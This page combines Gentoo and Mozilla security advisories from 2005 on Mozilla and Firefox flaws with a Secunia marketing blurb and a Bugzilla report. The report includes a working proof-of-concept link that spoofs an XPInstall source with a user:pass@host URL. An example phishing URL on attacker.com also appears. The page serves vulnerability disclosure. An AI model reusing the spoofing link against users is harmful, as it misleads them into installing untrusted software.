# Mozilla Suite: Multiple vulnerabilities — GLSA **200503-30**

The Mozilla Suite is vulnerable to multiple issues ranging from the remote
execution of arbitrary code to various issues allowing to trick the user
into trusting fake web sites or interacting with privileged content.

### Affected packages

| Package | **www-client/mozilla** on all architectures |
| --- | --- |
| Affected versions | < **1.7.6** |
| Unaffected versions | >= **1.7.6** |

| Package | **www-client/mozilla-bin** on all architectures |
| --- | --- |
| Affected versions | < **1.7.6** |
| Unaffected versions | >= **1.7.6** |

### Background

The Mozilla Suite is a popular all-in-one web browser that
includes a mail and news reader.

### Description

The following vulnerabilities were found and fixed in the Mozilla
Suite:

* Mark Dowd from ISS X-Force reported an exploitable
  heap overrun in the GIF processing of obsolete Netscape extension 2
  (CAN-2005-0399)
* Michael Krax reported that plugins can be used
  to load privileged content and trick the user to interact with it
  (CAN-2005-0232, CAN-2005-0527)
* Michael Krax also reported
  potential spoofing or cross-site-scripting issues through overlapping
  windows, image or scrollbar drag-and-drop, and by dropping javascript:
  links on tabs (CAN-2005-0230, CAN-2005-0231, CAN-2005-0401,
  CAN-2005-0591)
* Daniel de Wildt and Gael Delalleau discovered a
  memory overwrite in a string library (CAN-2005-0255)
* Wind Li
  discovered a possible heap overflow in UTF8 to Unicode conversion
  (CAN-2005-0592)
* Eric Johanson reported that Internationalized
  Domain Name (IDN) features allow homograph attacks (CAN-2005-0233)
* Mook, Doug Turner, Kohei Yoshino and M. Deaudelin reported various
  ways of spoofing the SSL "secure site" indicator (CAN-2005-0593)
* Georgi Guninski discovered that XSLT can include stylesheets from
  arbitrary hosts (CAN-2005-0588)
* Secunia discovered a way of
  injecting content into a popup opened by another website
  (CAN-2004-1156)
* Phil Ringnalda reported a possible way to
  spoof Install source with user:pass@host (CAN-2005-0590)
* Jakob
  Balle from Secunia discovered a possible way of spoofing the Download
  dialog source (CAN-2005-0585)
* Christian Schmidt reported a
  potential spoofing issue in HTTP auth prompt tab (CAN-2005-0584)
* Finally, Tavis Ormandy of the Gentoo Linux Security Audit Team
  discovered that Mozilla insecurely creates temporary filenames in
  /tmp/plugtmp (CAN-2005-0578)

### Impact

* The GIF heap overflow could be triggered by a malicious GIF
  image that would end up executing arbitrary code with the rights of the
  user running Mozilla. The other overflow issues, while not thought to
  be exploitable, would have the same impact
* By setting up
  malicious websites and convincing users to follow untrusted links or
  obey very specific drag-and-drop or download instructions, attackers
  may leverage the various spoofing issues to fake other websites to get
  access to confidential information, push users to download malicious
  files or make them interact with their browser preferences
* The
  temporary directory issue allows local attackers to overwrite arbitrary
  files with the rights of another local user

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Suite users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/mozilla-1.7.6"
```

All Mozilla Suite binary users should upgrade to the latest
version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/mozilla-bin-1.7.6"
```

# Mozilla Firefox: Various vulnerabilities — GLSA **200503-10**

Mozilla Firefox is vulnerable to a local file deletion issue and to various
issues allowing to trick the user into trusting fake web sites or
interacting with privileged content.

### Affected packages

| Package | **www-client/mozilla-firefox** on all architectures |
| --- | --- |
| Affected versions | < **1.0.1** |
| Unaffected versions | >= **1.0.1** |

| Package | **www-client/mozilla-firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **1.0.1** |
| Unaffected versions | >= **1.0.1** |

### Background

Mozilla Firefox is the popular next-generation browser from the
Mozilla project.

### Description

The following vulnerabilities were found and fixed in Mozilla
Firefox:

* Michael Krax reported that plugins can be used
  to load privileged content and trick the user to interact with it
  (CAN-2005-0232, CAN-2005-0527)
* Michael Krax also reported
  potential spoofing or cross-site-scripting issues through overlapping
  windows, image drag-and-drop, and by dropping javascript: links on tabs
  (CAN-2005-0230, CAN-2005-0231, CAN-2005-0591)
* Daniel de Wildt
  and Gael Delalleau discovered a memory overwrite in a string library
  (CAN-2005-0255)
* Wind Li discovered a possible heap overflow in
  UTF8 to Unicode conversion (CAN-2005-0592)
* Eric Johanson
  reported that Internationalized Domain Name (IDN) features allow
  homograph attacks (CAN-2005-0233)
* Mook, Doug Turner, Kohei
  Yoshino and M. Deaudelin reported various ways of spoofing the SSL
  "secure site" indicator (CAN-2005-0593)
* Matt Brubeck reported
  a possible Autocomplete data leak (CAN-2005-0589)
* Georgi
  Guninski discovered that XSLT can include stylesheets from arbitrary
  hosts (CAN-2005-0588)
* Secunia discovered a way of injecting
  content into a popup opened by another website (CAN-2004-1156)
* Phil Ringnalda reported a possible way to spoof Install source with
  user:pass@host (CAN-2005-0590)
* Jakob Balle from Secunia
  discovered a possible way of spoofing the Download dialog source
  (CAN-2005-0585)
* Christian Schmidt reported a potential
  spoofing issue in HTTP auth prompt tab (CAN-2005-0584)
* Andreas
  Sanblad from Secunia discovered a possible way of spoofing the Download
  dialog using the Content-Disposition header (CAN-2005-0586)
* Finally, Tavis Ormandy of the Gentoo Linux Security Audit Team
  discovered that Firefox insecurely creates temporary filenames in
  /tmp/plugtmp (CAN-2005-0578)

### Impact

* By setting up malicious websites and convincing users to
  follow untrusted links or obey very specific drag-and-drop or download
  instructions, attackers may leverage the various spoofing issues to
  fake other websites to get access to confidential information, push
  users to download malicious files or make them interact with their
  browser preferences.
* The temporary directory issue allows
  local attackers to overwrite arbitrary files with the rights of another
  local user.
* The overflow issues, while not thought to be
  exploitable, may allow a malicious downloaded page to execute arbitrary
  code with the rights of the user viewing the page.

### Workaround

There is no known workaround at this time.

### Resolution

All Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/mozilla-firefox-1.0.1"
```

All Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/mozilla-firefox-bin-1.0.1"
```

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Core Graveyard :: Installer: XPInstall Engine
For bugs in the underlying cross-platform installation technology. If you encounter an installation failure via a web page, it probably belongs here. Content developers should also report failures of the XPInstall API to this component.

Examples of appropriate bugs: Installer not installing all files; FinalizeInstall() doesn't check or return error codes; or Text from XPInstall confirmation dialog needs revision.

User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.3) Gecko/20041101 Firefox/1.0RC2
Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.3) Gecko/20041101 Firefox/1.0RC2
Between not checking for a spoofed URL with a username/password, and the
unresizeable, unwrapped dialog for XPInstall, it's possible to make a fairly
convincing spoofed URL for an XPI with InstallTrigger:
<a href="javascript:void(InstallTrigger.install({'Safety
First!':'<http://update%2Emozilla%2Eorg%5C%5Cextensions%5C%5Csafe_as_houses@philringnalda.com/mozilla/livemarkthis.xpi>'}))">Install
from update.mozilla.org</a>
The install dialog (with my font size, on WinXP) will then say the xpi is coming
from |<http://update.mozilla.org\extensions\safe_a>|, with the full URL only
visible by copying and pasting into another program.
I'm not sure if it's possible to get a more convincing URL than that, thanks to
other bugs I discovered while trying (the EM apparently misparses URLs, so any /
in the username (even as %2F) causes a download failure, and the install dialog
treats \ as an escape (even as %5C), so a pair are required to display one). If
that's the very best spoofed URL possible, it's not quite earth-shaking serious,
but then I'm not a very good spoofer.
Reproducible: Always
Steps to Reproduce:
1. Visit URL, click link to install.
2. Add site to install-prompt whitelist.
3. Click link again to really install.
4. Vaguely examine URL in install prompt, think "update.mozilla.org, that's safe"
Actual Results:
The extension (it's just my right-click "Add Live Bookmark for this link", safe
enough to actually install) was installed.
Expected Results:
Throw up the spoof-warning alert before the install prompt.

My opinion is that the aspect of this bug which relates to the display of
white-listed sites is the most critical part. This is our last line of defense,
and needs to be a protected means of ensuring people know who they are trusting.
(Especially in light of potential attacks wherein malicious Extensions add to
the white-list.)

OK, I don't understand why you need to call |spec.Assign("\0");|
What is it that you are trying to accomplish? |spec| is already
null terminated just by virtue of being a nsCAutoString.

I think they're trying to make sure the string is empty. The more usual idiom
for that is mystr.Truncate(), but a newly created nsCString is going to be an
empty to start with.
But making the variable spec do double-duty here is confusing. Just set the
user/pass to a literal blank string (since the EmptyCString() helper didn't
exist back then).

I believe that you should change this to:
nsCAutoString spec;
uri->SetUserPass(spec);
uri->GetSpec(spec);
Is there some reason why this does not work?

sure that works. My opinion is that not give variable spec double duty as Daniel

# Mozilla Foundation Security Advisory 2005-17

## Install source spoofing with user:pass@host

Announced
February 24, 2005
Reporter
Phil Ringnalda
Risk
Low
Impact
Low
Products
Firefox, Mozilla Suite, Thunderbird
Fixed in

* Firefox 1.0.1
* Mozilla Suite 1.7.6
* Thunderbird 1.0.2

### Description

The installation confirmation dialog shows the source of the software.
By adding a long, fake "user:pass" in front of the true hostname the
user might be convinced to trust software that comes from an untrustworthy
source. This is similar to attempts used in some phishing mail:
"http://www.mozilla.org@attacker.com/install.xpi".

By default Firefox only allows install attempts from http://update.mozilla.org,
a user would need to explicitly allow the spoofing host to initiate
installs before it could try this trick.

### Workaround

Do not install software when prompted by untrusted sites. Enlarge
the install confirmation dialog and verify that "@" does not
appear before the first "/" character.

> I like the fact that they really dig into things and then provide answers. As the single Linux guy, I kind of need that second admin next to me sometimes to say, "Hey, what about this?" and I am able to do that through the portal. I get my questions answered and trouble tickets resolved.
